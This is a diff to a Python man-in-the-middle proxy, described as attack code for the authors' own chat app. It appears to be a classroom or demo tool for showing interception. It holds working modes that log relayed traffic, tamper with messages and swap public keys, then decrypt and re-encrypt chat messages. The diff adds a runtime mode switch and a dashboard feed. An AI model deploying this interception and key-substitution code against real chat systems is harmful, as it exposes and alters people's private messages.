@@ -21,6 +21,7 @@ Attack code, for our own app on our own machines only.
 import argparse
 import base64
 import binascii
+import os
 import socket
 import threading
 from datetime import datetime
@@ -47,7 +48,8 @@ LISTEN_PORT = 6060  # where clients connect, thinking it's the server
 SERVER_HOST = "127.0.0.1"  # the real server
 SERVER_PORT = 5050  # the real server's port
 LOG_FILE = "intercepted.log"
-MODES = ("log", "tamper", "swap-keys")
+# "off" = forward only, no logging (clients can stay pointed here the whole demo).
+MODES = ("off", "log", "tamper", "swap-keys")
 
 # Tampering happens on the way IN to the server only. When both clients sit
 # behind this MITM, every message passes through it twice (sender->server and
@@ -58,8 +60,11 @@ TAMPER_DIRECTION = "client->server"
 _log_lock = threading.Lock()
 
 
-def log_message(log_file, direction, msg):
-    """Write one intercepted message to the log file and print it on screen."""
+def log_message(log_file, direction, msg, on_event=None):
+    """Write one intercepted message to the log file and print it on screen.
+
+    If on_event is given, also push a classified entry to the dashboard feed.
+    """
     timestamp = datetime.now().strftime("%H:%M:%S")
     line = f"[{timestamp}] {direction} {msg}"
     with _log_lock:
@@ -69,6 +74,49 @@ def log_message(log_file, direction, msg):
         # character and we'd lose that message and every one after it.
         with open(log_file, "a", encoding="utf-8", errors="replace") as f:
             f.write(line + "\n")
+    if on_event is not None:
+        on_event({"time": timestamp, "direction": direction, "text": str(msg)})
+
+
+class AttackState:
+    """Shared, mutable state for one running MITM: the current mode, the key
+    swapper, and the live connections. The dashboard flips the mode at runtime;
+    the pumps read it per frame, so no restart is needed.
+    """
+
+    def __init__(self, mode="off", on_event=None):
+        self.mode = mode if mode in MODES else "off"
+        self.swapper = KeySwapper()
+        self.on_event = on_event  # optional callback(dict) for the dashboard feed
+        self._lock = threading.Lock()
+        self._conns: set = set()  # live client/server socket pairs, to drop on a reset
+
+    def register(self, pair) -> None:
+        with self._lock:
+            self._conns.add(pair)
+
+    def unregister(self, pair) -> None:
+        with self._lock:
+            self._conns.discard(pair)
+
+    def set_mode(self, mode: str) -> bool:
+        """Change mode. Switching to/from swap-keys drops live connections so the
+        clients reconnect and redo the handshake through the new mode (that's the
+        moment the key-change alarm fires). Returns False for an unknown mode."""
+        if mode not in MODES:
+            return False
+        with self._lock:
+            was_swap = self.mode == "swap-keys"
+            self.mode = mode
+            drop = (mode == "swap-keys") != was_swap
+            conns = list(self._conns) if drop else []
+        for client_sock, server_sock in conns:
+            for sock in (client_sock, server_sock):
+                try:
+                    sock.shutdown(socket.SHUT_RDWR)
+                except OSError:
+                    pass
+        return True
 
 
 def tamper(msg):
@@ -124,7 +172,7 @@ class KeySwapper:
         with self._lock:
             return self._key_with.get(user)
 
-    def rewrite(self, msg, sender, log_file):
+    def rewrite(self, msg, sender, log_file, on_event=None):
         """Rewrite one client->server frame. Returns the frame to forward on.
 
         pubkey: replace the real key with ours. encrypted: decrypt with the key
@@ -154,36 +202,40 @@ class KeySwapper:
                 )
             except IntegrityError:
                 return msg
-            log_message(log_file, f"DECRYPTED {sender}->{recipient}:", text)
+            log_message(log_file, f"DECRYPTED {sender}->{recipient}:", text, on_event)
             nonce, ciphertext = encrypt_message(recipient_key, text, chat_aad(sender, recipient))
             return {**msg, "nonce": nonce, "ciphertext": ciphertext}
         return msg
 
 
-def pump(source, destination, direction, log_file, mode="log", swapper=None, names=None):
+def pump(source, destination, direction, log_file, state, names=None):
     """Read messages from source, log them, and pass them to destination.
 
-    Runs until one side hangs up or the stream breaks. One pump handles one
-    direction; we run two so both directions flow at once. Any socket or
-    protocol error just ends this direction cleanly instead of crashing the
-    thread, and handle_client() closes both sockets afterwards.
+    The mode is read from ``state`` per frame, so the dashboard can change it
+    mid-stream. Runs until one side hangs up or the stream breaks. One pump
+    handles one direction; we run two so both directions flow at once. Any
+    socket or protocol error just ends this direction cleanly instead of
+    crashing the thread, and handle_client() closes both sockets afterwards.
     """
     try:
         while True:
             msg = recv_msg(source)
             if msg is None:  # the other side closed cleanly
                 break
-            log_message(log_file, direction, msg)
+            mode = state.mode
+            if mode != "off":
+                log_message(log_file, direction, msg, state.on_event)
             if direction == TAMPER_DIRECTION:
                 if names is not None and msg.get("type") == "register":
                     names["user"] = msg.get("username")  # this client's name
                 if mode == "tamper":
                     altered = tamper(msg)
                     if altered is not msg:
-                        log_message(log_file, f"{direction} TAMPERED", altered)
+                        log_message(log_file, f"{direction} TAMPERED", altered, state.on_event)
                         msg = altered
-                elif mode == "swap-keys" and swapper is not None:
-                    msg = swapper.rewrite(msg, names.get("user") if names else None, log_file)
+                elif mode == "swap-keys":
+                    sender = names.get("user") if names else None
+                    msg = state.swapper.rewrite(msg, sender, log_file, state.on_event)
             send_msg(destination, msg)
     except (OSError, ProtocolError, BadMessage):
         # A reset connection, a half-closed socket, or a malformed frame.
@@ -191,7 +243,7 @@ def pump(source, destination, direction, log_file, mode="log", swapper=None, nam
         pass
 
 
-def handle_client(client_sock, server_host, server_port, log_file, mode="log", swapper=None):
+def handle_client(client_sock, server_host, server_port, log_file, state):
     """One client connected to us. Connect to the real server and relay both ways."""
     server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
@@ -205,24 +257,37 @@ def handle_client(client_sock, server_host, server_port, log_file, mode="log", s
     # Shared per-client box so the client->server pump can record this
     # connection's registered username for the key-swap rewrite.
     names: dict = {}
-    # Forward client->server in the background; server->client in this thread.
-    up = threading.Thread(
-        target=pump,
-        args=(client_sock, server_sock, "client->server", log_file, mode, swapper, names),
-        daemon=True,
-    )
-    up.start()
-    pump(server_sock, client_sock, "server->client", log_file, mode, swapper, names)
+    pair = (client_sock, server_sock)
+    state.register(pair)  # so set_mode() can drop us on a swap-keys switch
 
-    # When either direction ends, close both sockets. Closing them makes the
-    # other pump's blocked recv return, so no thread or socket is left dangling
-    # and the real server sees the client leave (freeing the username).
+    def teardown():
+        # Shut down BOTH sockets so a pump blocked on recv in the other
+        # direction wakes up. Without this, when the client hangs up the
+        # server-side pump stays blocked, the real server never sees the
+        # client leave, and the username stays registered (which breaks a
+        # quick reconnect with the same name).
+        for sock in (client_sock, server_sock):
+            try:
+                sock.shutdown(socket.SHUT_RDWR)
+            except OSError:
+                pass
+
+    def forward_up():
+        pump(client_sock, server_sock, "client->server", log_file, state, names)
+        teardown()  # client closed -> wake the server->client pump
+
+    up = threading.Thread(target=forward_up, daemon=True)
+    up.start()
+    pump(server_sock, client_sock, "server->client", log_file, state, names)
+    teardown()  # server closed (or we were woken) -> ensure both directions end
+    up.join(timeout=1)
+
+    state.unregister(pair)
     for sock in (client_sock, server_sock):
         try:
-            sock.shutdown(socket.SHUT_RDWR)
+            sock.close()
         except OSError:
             pass
-        sock.close()
 
 
 def main(argv=None):
@@ -249,38 +314,57 @@ def main(argv=None):
     parser.add_argument("--log-file", default=LOG_FILE, help="where to write intercepted traffic")
     args = parser.parse_args(argv)
 
-    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    listener.bind((args.host, args.port))
-    listener.listen()
-    # One shared swapper holds the attacker's keypair and the keys it shares
-    # with each client, across all connection threads (swap-keys only).
-    swapper = KeySwapper() if args.mode == "swap-keys" else None
+    listener, state = start_listener(
+        args.host, args.port, args.server_host, args.server_port, args.log_file, args.mode
+    )
     print(
         f"[mitm] mode={args.mode} listening on {args.host}:{args.port}, "
         f"forwarding to {args.server_host}:{args.server_port}"
     )
-
     try:
-        while True:
-            client_sock, addr = listener.accept()
-            print(f"[mitm] client connected from {addr}")
-            threading.Thread(
-                target=handle_client,
-                args=(
-                    client_sock,
-                    args.server_host,
-                    args.server_port,
-                    args.log_file,
-                    args.mode,
-                    swapper,
-                ),
-                daemon=True,
-            ).start()
+        # start_listener() already runs the accept loop on its own thread; a
+        # second accept() here would steal (and silently drop) half the clients.
+        threading.Event().wait()
     except KeyboardInterrupt:
         print("\n[mitm] stopping")
     finally:
         listener.close()
+
+
+def start_listener(host, port, server_host, server_port, log_file, mode="off", on_event=None):
+    """Bind and start the accept loop on a background thread. Returns
+    (listener, AttackState). The caller controls the mode via the state and
+    closes the listener to stop. Used by main() and by the demo launcher."""
+    state = AttackState(mode=mode, on_event=on_event)
+    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    if os.name != "nt":
+        # Quick restarts on macOS/Linux. Skipped on Windows, where SO_REUSEADDR
+        # lets a second program listen on a port that's already in use, and the
+        # first one keeps getting the connections. That silently routed the
+        # demo's windows to an old terminal MITM. Same rule as server.py.
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        listener.bind((host, port))
+        listener.listen()
+    except OSError:
+        listener.close()
+        raise
+
+    def accept_loop():
+        while True:
+            try:
+                client_sock, addr = listener.accept()
+            except OSError:
+                return  # listener closed
+            print(f"[mitm] client connected from {addr}")
+            threading.Thread(
+                target=handle_client,
+                args=(client_sock, server_host, server_port, log_file, state),
+                daemon=True,
+            ).start()
+
+    threading.Thread(target=accept_loop, daemon=True).start()
+    return listener, state
 
 
 if __name__ == "__main__":
